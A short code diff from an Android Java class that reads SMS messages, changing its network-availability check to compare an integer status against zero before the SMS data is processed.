@@ -40,7 +40,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 				null, "date desc");
 		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
 
-		if (NetworkChangeReceiver.isOnline(mContext)) {
+		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
 			complete = "0";
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
